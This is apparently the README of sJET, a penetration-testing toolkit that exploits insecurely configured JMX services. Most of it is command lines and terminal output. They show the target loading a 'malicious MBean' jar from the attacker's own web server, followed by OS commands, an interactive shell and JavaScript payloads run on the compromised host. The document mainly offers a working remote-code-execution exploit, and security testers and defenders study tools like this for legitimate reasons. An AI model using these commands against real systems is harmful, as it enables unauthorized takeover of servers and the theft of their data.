# sJET by siberas

siberas JMX Exploitation Toolkit

sJET allows an easy exploitation of insecure configured JMX services. Additional background
information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) and [here](https://www.owasp.org/images/c/c1/JMX_-_Java_Management_Extensions_-_Hans-Martin_Muench.pdf).

## Prerequisites

* [Jython 2.7](http://www.jython.org/)

## Usage

SJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):

```
jython sjet.py targetHost targetPort password MODE (modeOptions)
```
Where

* **targetHost** -  the target IP address
* **targerPort** - the target port where JMX is running
* **password** - the password that is/was set during installation
* **MODE** - the script mode
* **modeOptions** - the options for the mode selected

### Modes and modeOptions

* **install** - installs the payload in the current target
  * *payload_url* - full URL to load the payload
  * *payload_port* - port to load the payload
* **uninstall** - uninstalls the payload from the current target
* **password** -  change the password on a already deployed payload
  * *password* - the new password
* **command** -  runs the command *CMD* in the targetHost
  * *CMD* - the command to run
* **shell** - starts a simple shell in targetHost (with the limitations of java's Runtime.exec())
* **javascript** - runs a javascript file *FILENAME* in the targetHost
  * *FILENAME* - the javascript to be run


## Example


### Installing the payload MBean on a vulnerable JMX service

In the following example, the vulnerable JMX service runs on the 192.168.11.136:9991, the attacker has
the IP address 192.168.11.132. The JMX service will connect to the web service of the attacker to download
the payload jar file. sJET will start the necessary web service on port 8000.

After the successful installation of the MBean, the default password is changed to the password that was provided
at the command line ("super_secret").

```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Starting webserver at port 8000
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Connected: rmi://192.168.11.132  1
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://192.168.11.132:8000
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /siberas_mlet.jar HTTP/1.1" 200 -
[+] Successfully loaded MBeanSiberas:name=payload,id=1
[+] Changing default password...
[+] Loaded de.siberas.lab.SiberasPayload
[+] Successfully changed password

h0ng10@rocksteady:~/sjet$
```

Installation with JMX credentials (also needs a weak configuration of the server):
```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Starting webserver at port 8000
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Using credentials: JMXUSER / JMXPASSWORD
[+] Connected: rmi://192.168.11.132  1
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://192.168.11.132:8000
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /siberas_mlet.jar HTTP/1.1" 200 -
[+] Successfully loaded MBeanSiberas:name=payload,id=1
[+] Changing default password...
[+] Loaded de.siberas.lab.SiberasPayload
[+] Successfully changed password

h0ng10@rocksteady:~/sjet$
```

### Running the command 'ls -la' in a Linux target:

After the payload was installed, we can use it to execute OS commands on the target.

```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret command "ls -la"
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Connected: rmi://192.168.11.132  2
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing command: ls -la
total 16
drwxr-xr-x  4 root    root    4096 Aug 22 16:12 .
drwxr-xr-x 66 root    root    4096 Aug 22 16:12 ..
lrwxrwxrwx  1 root    root      12 Mär 29 01:46 conf -> /etc/tomcat8
drwxr-xr-x  2 tomcat8 tomcat8 4096 Mär 29 01:46 lib
lrwxrwxrwx  1 root    root      17 Mär 29 01:46 logs -> ../../log/tomcat8
drwxrwxr-x  3 tomcat8 tomcat8 4096 Aug 22 16:12 webapps
lrwxrwxrwx  1 root    root      19 Mär 29 01:46 work -> ../../cache/tomcat8


[+] Done
h0ng10@rocksteady:~/sjet$
```
### Running ping in shell mode on a target

If you don't want to load Java for every command, you can use the "shell mode"
to get a limited command shell.

```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret shell
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Connected: rmi://192.168.11.132  3
[+] Use command 'exit_shell' to exit the shell
>>> ping -c 3 127.0.0.1
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing command: ping -c 3 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.075 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.044/0.055/0.075/0.014 ms


>>> exit_shell
[+] Done
h0ng10@rocksteady:~/sjet$
```

### Invoke a JavaScript payload on a target:

The example script "javaproperties.js" displays the Java properties of the vulnerable
service. It can be invoked as follows:

```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret javascript scripts/javaproperties.js
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Connected: rmi://192.168.11.132  4
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing script
java.vendor=Oracle Corporation
sun.java.launcher=SUN_STANDARD
catalina.base=/var/lib/tomcat8
sun.management.compiler=HotSpot 64-Bit Tiered Compilers
catalina.useNaming=true
os.name=Linux
...
java.vm.name=OpenJDK 64-Bit Server VM
file.encoding=UTF-8
java.specification.version=1.8


h0ng10@rocksteady:~/sjet$
```

### Change the password

Change the existing password ("super_secret") to "this-is-the-new-password":

```
h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret password this-is-the-new-password
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Connected: rmi://192.168.11.132  6
[+] Loaded de.siberas.lab.SiberasPayload
[+] Successfully changed password

[+] Done
h0ng10@rocksteady:~/sjet$
```

### Uninstall the payload MBean from the target


Uninstall the payload 'Siberas' from the target:

```
minmaxer@prellermbp:~/sjet$ jython sjet.py 192.168.1.101 9010 super_secret uninstall
sJET - siberas JMX Exploitation Toolkit
=======================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.1.101:9010/jmxrmi
[+] Connected: rmi://192.168.1.1  16
[+] MBean correctly uninstalled
minmaxer@prellermbp:~/sjet$
```


## Contributing

Feel free to contribute.

## Authors

* **Hans-Martin Münch** - *Initial idea and work* - [h0ng10](https://twitter.com/h0ng10)
* **Patricio Reller** - *CLI and extra options* - [preller](https://github.com/preller)

See also the list of [contributors](https://github.com/h0ng10/sjet/graphs/contributors) who participated in this project.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
